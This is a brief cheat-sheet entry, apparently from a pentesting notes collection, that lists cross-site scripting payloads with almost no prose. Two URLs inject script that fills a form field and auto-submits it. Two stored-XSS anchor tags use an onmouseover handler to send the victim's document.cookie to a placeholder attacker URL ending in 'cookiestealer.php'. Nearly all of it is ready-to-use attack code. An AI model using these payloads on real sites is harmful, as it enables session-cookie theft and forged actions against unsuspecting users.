# Inject JavaScript Code

Search Tag(s): #helpers #xss

- XSS DOM object

```
http[s]://<IP>/index.php?<parameter_id>=<script>window.onload=function(){document.getElementsByName('<html_attribute_field>')[0].innerHTML='XSS is easy!';document.getElementById('<html_ID_attribute>').submit();}</script>

http[s]://<IP>/index.php?page=<script>window.onload=function(){document.getElementsByName('comment')[0].innerHTML='XSS is easy!';document.getElementById('post').submit();}</script>
```

- For stored XSS

```
<a href="https://www.google.com/search?q=what+is+xss" onmouseover="window.location='http[s]://<attacker_URL>/cookiestealer.php='+escape(document.cookie)"What is XSS?

<a href="https://www.google.com/search?q=what+is+xss" onmouseover="window.location='http[s]://<attacker_URL>/cookiestealer.php?cookie='+escape(document.cookie)"What is XSS?
```